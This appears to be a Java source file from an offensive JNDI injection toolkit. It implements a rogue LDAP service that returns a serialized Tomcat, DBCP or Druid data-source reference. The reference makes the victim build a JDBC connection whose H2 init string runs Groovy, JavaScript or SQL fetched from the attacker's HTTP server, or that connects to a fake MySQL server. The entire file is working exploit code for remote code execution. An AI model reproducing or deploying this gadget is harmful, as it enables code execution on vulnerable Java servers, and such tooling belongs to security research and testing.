package net.roboterh.injector.gadgets;

import cn.hutool.http.HttpUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.servers.HTTPServer;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/*
    TomcatOrDruidJdbc Way:
    Requirement:
        dbcp1_tomcat / dbcp2_tomcat / commons-dbcp2  /commons-dbcp1 in classpath
        particular jdbc drivers in classpath
        There are other factories playing the same role
            tomcat-jdbc / druid in classpath
    Explanation:
        Once the attribute `initialSize` more than the 0, the method `getLogWriter` will be called.
        Then it could build a connection of JDBC

        Particularly, the payload of DruidJDBC way is different from other payloads. The difference is that
        it would add an attribute named init as `true`
 */
public class TomcatOrDruidJdbc implements LDAPService{
    public static void main(String[] args) {
        String s = HttpUtil.get("http://127.0.0.1:8000/Groovy.groovy");
        System.out.println(s);
    }
    private static final Logger logger = LogManager.getLogger(TomcatOrDruidJdbc.class);

    private String factory;
    private String database;
    private String filename;
    private String[] params;
    private String jdbcUrl;

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);

        generateHandler();

        try {
            logger.info(String.format("Send LDAP result for %s using TomcatOrDruidJdbc Way ...", baseDN));

            // create ResourceRef
            ResourceRef ref = new ResourceRef("javax.sql.DataSource", null, "", "",
                    true, factory, null);
            ref.add(new StringRefAddr("driverClassName", database));
            ref.add(new StringRefAddr("url", jdbcUrl));
            ref.add(new StringRefAddr("username", "root"));
            ref.add(new StringRefAddr("password", "root"));
            ref.add(new StringRefAddr("initialSize", "1"));

            if (factory.equalsIgnoreCase("com.alibaba.druid.pool.DruidDataSourceFactory")) {
                // druid is a particular factory
                ref.add(new StringRefAddr("init", "true"));
            }

            Entry entry = new Entry(baseDN);
            entry.addAttribute("javaClassName", "java.lang.Class");
            entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
            result.sendSearchEntry(entry);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception e) {
            logger.info(e.getMessage());
        }
    }

    @Override
    public void argsHandler(String baseDN) {
        int firstIndex = baseDN.indexOf("/");
        int secondIndex = baseDN.indexOf("/", firstIndex + 1);
        int thirdIndex = baseDN.indexOf("/", secondIndex + 1);

        // obtain the database of payload
        switch (baseDN.substring(firstIndex + 1, secondIndex)) {
            case "H2":
                database = "org.h2.Driver";
                break;
            case "Mysql":
                database = "com.mysql.jdbc.Driver";
                break;
//            case "MysqlFabric":
//                database = "com.mysql.fabric.jdbc.FabricMySQLDriver";
//                break;
        }

        // obtain the factory of payload
        switch (baseDN.substring(secondIndex + 1, thirdIndex)) {
            case "dbcp1Tomcat":
                factory = "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory";
                break;
            case "dbcp2Tomcat":
                factory = "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory";
                break;
            case "commonsDbcp1":
                factory = "org.apache.commons.dbcp.BasicDataSourceFactory";
                break;
            case "commonsDbcp2":
                factory = "org.apache.commons.dbcp2.BasicDataSourceFactory";
                break;
            case "tomcatJdbc":
                factory = "org.apache.tomcat.jdbc.pool.DataSourceFactory";
                break;
            case "druid":
                factory = "com.alibaba.druid.pool.DruidDataSourceFactory";
                break;
        }

        // obtain the value of payload
        if (!database.equalsIgnoreCase("Mysql")) {
            filename = baseDN.substring(thirdIndex + 1);
            logger.info(String.format("Received factory is %s, database is %s " +
                    "and remote filename are %s ...", factory, database, filename));
        } else {
            // if database is mysql, and the number of parameter is more than 1
            int fourthIndex = baseDN.indexOf("/", thirdIndex + 1);
            int fifthIndex = baseDN.indexOf("/", fourthIndex + 1);

            String fakeMysqlIp = baseDN.substring(thirdIndex + 1, fourthIndex);
            String fakeMysqlPort = baseDN.substring(fourthIndex + 1, fifthIndex);
            String fakeMysqlAttribute = baseDN.substring(fifthIndex + 1);
            params = new String[]{fakeMysqlIp, fakeMysqlPort, fakeMysqlAttribute};

            logger.info(String.format("Received factory is %s, database is %s " +
                    "and params are %s ...", factory, database, params));
        }
    }

    @Override
    public void generateHandler() {
        if (filename.endsWith(".groovy") && database.equalsIgnoreCase("org.h2.Driver")) {
            String groovy = HttpUtil.get(HTTPServer.codeBase + filename);
            jdbcUrl = "jdbc:h2:mem:dbtest;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
        } else if (filename.endsWith(".js") && database.equalsIgnoreCase("org.h2.Driver")) {
            String javascript = HttpUtil.get(HTTPServer.codeBase + filename);
            jdbcUrl = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
        } else if (filename.endsWith(".sql") && database.equalsIgnoreCase("org.h2.Driver")) {
            String sql = HttpUtil.get(HTTPServer.codeBase + filename);
            jdbcUrl = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '" + sql + "'";
        } else if (database.equalsIgnoreCase("com.mysql.jdbc.Driver")) {
            jdbcUrl = String.format("jdbc:mysql://%s:%s/test?%s", params[0], params[1], params[2]);
        }
    }
}
